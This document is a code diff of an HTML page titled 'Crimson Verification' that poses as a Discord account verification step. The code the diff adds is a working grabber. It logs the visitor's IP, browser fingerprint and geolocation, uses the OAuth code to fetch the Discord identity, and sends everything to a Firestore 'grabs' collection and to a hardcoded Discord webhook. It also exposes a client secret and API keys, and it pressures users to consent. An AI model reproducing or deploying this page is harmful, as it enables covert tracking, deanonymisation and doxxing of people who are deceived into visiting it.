@@ -2,98 +2,266 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Discord QuickConnect</title>
+  <title>Crimson Verification</title>
   <style>
     body {
       font-family: sans-serif;
-      background: #111;
-      color: #eee;
       text-align: center;
       padding: 2rem;
+      background: #121212;
+      color: #e0f8d8;
     }
-    .hidden { display: none; }
+    .screen {
+      display: none;
+    }
+    .screen.active {
+      display: block;
+    }
     button {
-      padding: 0.7rem 1.5rem;
-      font-size: 1.2rem;
-      background: #5865F2;
-      color: white;
+      padding: .5rem 1rem;
+      font-size: 1rem;
       border: none;
-      border-radius: 8px;
+      border-radius: .5rem;
+      background: #39ff14;
+      color: #000;
       cursor: pointer;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.6);
+      transition: transform .2s, box-shadow .2s;
     }
-    .spinner {
-      border: 4px solid #333;
-      border-top: 4px solid #5865F2;
-      border-radius: 50%;
-      width: 40px;
-      height: 40px;
-      animation: spin 1s linear infinite;
-      margin: 2rem auto;
+    button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 8px rgba(0,0,0,0.6);
     }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
+    .denied {
+      color: #e53935;
     }
   </style>
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.17.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.17.2/firebase-firestore-compat.js"></script>
 </head>
 <body>
-  <h1>Connecting Your Discord Account</h1>
-  <p>Click below to continue securely with Discord.</p>
-  <div id="main-ui">
-    <button onclick="startDiscordFlow()">Continue with Discord</button>
+
+  <!-- 1. Loading → grab IP -->
+  <div id="load-screen" class="screen active">
+    <h2>loading your IP…</h2>
   </div>
-  <div id="loading" class="hidden">
-    <div class="spinner"></div>
-    <p>Verifying credentials...</p>
+
+  <!-- 2. Ask for Discord Auth -->
+  <div id="auth-screen" class="screen">
+    <h2>Please authorize with Discord</h2>
+    <button id="authorize-btn">Authorize via Discord</button>
+    <p id="retry-count"></p>
+  </div>
+
+  <!-- 3. Denied Block -->
+  <div id="denied-screen" class="screen">
+    <h2 class="denied">Access Denied</h2>
+    <p>If you refuse 3 times, we really can’t show you the rest of the site.</p>
+    <button id="back-to-auth">Try Again</button>
+  </div>
+
+  <!-- 4. Final Message -->
+  <div id="final-screen" class="screen">
+    <h2>All done!</h2>
+    <p>Thanks, you can close this tab now.</p>
+  </div>
+
+  <!-- 5. Error / 24h Retry -->
+  <div id="error-screen" class="screen">
+    <h2>Authentication Error</h2>
+    <p>Please come back in 24 hours.</p>
   </div>
 
   <script>
-    const CLIENT_ID = 'YOUR_CLIENT_ID';
-    const REDIRECT_URI = 'https://YOUR_VERCEL_APP.vercel.app';
+    // ─── CONFIG ─────────────────────────────────────────
+    const DISCORD_CLIENT_ID = '1367845417773039687';
+    const REDIRECT_URI     = 'https://crimson-verification.vercel.app';
+    const FIREBASE_CONFIG = {
+      apiKey: "AIzaSyDVYhiYuhrHRPYYzxq7LKPW8bf_2obXsiI",
+      authDomain: "crimson-66937.firebaseapp.com",
+      projectId: "crimson-66937",
+      storageBucket: "crimson-66937.firebasestorage.app",
+      messagingSenderId: "425261971902",
+      appId: "1:425261971902:web:d2fece6dee8e3e4c7be1ef"
+    };
+    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1372025180980777090/XfS5Bp9zGfHckQN0z3pSTGcStjnBQhlU9VIvNgNjHa-yJvE5NFJm9qOAlYoEMhj0cuRB';
 
-    function startDiscordFlow() {
-      document.getElementById('main-ui').classList.add('hidden');
-      document.getElementById('loading').classList.remove('hidden');
+    // ─── FIREBASE INIT ──────────────────────────────────
+    firebase.initializeApp(FIREBASE_CONFIG);
+    const db = firebase.firestore();
 
-      window.location.href = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify`;
+    // ─── STATE ───────────────────────────────────────────
+    let userIP = null;
+    let denyCount = 0;
+
+    // ─── HELPERS ─────────────────────────────────────────
+    function show(id) {
+      document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+      document.getElementById(id).classList.add('active');
+    }
+    function updateRetryUI() {
+      document.getElementById('retry-count').innerText =
+        denyCount ? `Denied ${denyCount} time${denyCount>1?'s':''}` : '';
     }
 
-    async function sendInfo(code) {
-      let lat = null, lon = null;
+    // grab IP
+    async function grabIP() {
       try {
-        const pos = await new Promise((res, rej) => {
-          navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 });
-        });
-        lat = pos.coords.latitude;
-        lon = pos.coords.longitude;
-      } catch {}
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        userIP = data.ip;
+      } catch (e) {
+        console.warn('Failed to get IP:', e);
+        userIP = 'unknown';
+      }
+      show('auth-screen');
+      updateRetryUI();
+    }
 
-      await fetch('/api/callback', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          code,
-          platform: navigator.platform,
-          screenResolution: `${screen.width}x${screen.height}`,
-          userAgent: navigator.userAgent,
-          language: navigator.language,
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          latitude: lat,
-          longitude: lon
-        })
+    // collect browser info
+    function getExtraInfo() {
+      return {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        screenResolution: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timestamp: new Date().toISOString()
+      };
+    }
+
+    // attempt geolocation
+    function tryGetLocation() {
+      return new Promise(resolve => {
+        if (!navigator.geolocation) return resolve({ lat: null, lon: null });
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+          ()   => resolve({ lat: null, lon: null }),
+          { timeout: 5000 }
+        );
       });
     }
 
+    // handle redirect & denial
     async function handleRedirect() {
       const params = new URLSearchParams(window.location.search);
-      if (params.has('code')) {
-        document.getElementById('main-ui').classList.add('hidden');
-        document.getElementById('loading').classList.remove('hidden');
-        await sendInfo(params.get('code'));
-        setTimeout(() => window.close(), 3000);
+      if (params.has('error')) {
+        denyCount++;
+        if (denyCount >= 3) show('denied-screen');
+        else {
+          updateRetryUI();
+          show('auth-screen');
+        }
+        return;
       }
+      if (!params.has('code')) return;
+      const code = params.get('code');
+      show('load-screen');
+      await compileAndExport(code);
     }
 
-    window.onload = handleRedirect;
+    // compile data & export
+    async function compileAndExport(oauthCode) {
+      let discordUserId = 'unknown', discordUsername = 'unknown';
+      const extraInfo = getExtraInfo();
+      const geo       = await tryGetLocation();
+
+      // exchange code → token → user info
+      try {
+        const tokenRes = await fetch('https://discord.com/api/oauth2/token', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: new URLSearchParams({
+            client_id:     DISCORD_CLIENT_ID,
+            client_secret: 'qpfyIPK3yAhuSPEKEMdLUKNxakJek_J6',
+            grant_type:    'authorization_code',
+            code:          oauthCode,
+            redirect_uri:  REDIRECT_URI,
+            scope:         'identify'
+          })
+        });
+        const tokenData = await tokenRes.json();
+        if (tokenData.access_token) {
+          const userRes = await fetch('https://discord.com/api/users/@me', {
+            headers: { 'Authorization': `Bearer ${tokenData.access_token}` }
+          });
+          const userData = await userRes.json();
+          discordUserId   = userData.id;
+          discordUsername = `${userData.username}#${userData.discriminator}`;
+        }
+      } catch (e) {
+        console.error('Discord fetch error', e);
+      }
+
+      const fullData = {
+        ip:            userIP || 'unknown',
+        code:          oauthCode,
+        discordUserId,
+        discordUsername,
+        ...extraInfo,
+        latitude:      geo.lat,
+        longitude:     geo.lon,
+        ts:            new Date()
+      };
+
+      // save to Firestore
+      try {
+        await db.collection('grabs').add(fullData);
+      } catch (e) {
+        console.error('Firestore error', e);
+      }
+
+      // send to webhook
+      try {
+        await fetch(DISCORD_WEBHOOK, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content:
+              `New grab!\n` +
+              `IP: ${fullData.ip}\n` +
+              `Discord: ${discordUsername} (${discordUserId})\n` +
+              `UA: ${extraInfo.userAgent}\n` +
+              `Lang: ${extraInfo.language}\n` +
+              `Platform: ${extraInfo.platform}\n` +
+              `Screen: ${extraInfo.screenResolution}\n` +
+              `Timezone: ${extraInfo.timezone}\n` +
+              `Lat: ${geo.lat}\nLon: ${geo.lon}`
+          })
+        });
+      } catch (e) {
+        console.error('Webhook error', e);
+        show('error-screen');
+        setTimeout(() => window.close(), 5000);
+        return;
+      }
+
+      // done
+      show('final-screen');
+      setTimeout(() => window.close(), 3000);
+    }
+
+    // Discord authorize button
+    document.getElementById('authorize-btn').onclick = () => {
+      const url = new URL('https://discord.com/api/oauth2/authorize');
+      url.search = new URLSearchParams({
+        client_id:    DISCORD_CLIENT_ID,
+        redirect_uri: REDIRECT_URI,
+        response_type:'code',
+        scope:        'identify'
+      });
+      window.location.href = url;
+    };
+
+    // back-to-auth button
+    document.getElementById('back-to-auth').onclick = () => show('auth-screen');
+
+    // kick everything off in order
+    window.addEventListener('load', async () => {
+      await grabIP();
+      await handleRedirect();
+    });
   </script>
 </body>
 </html>
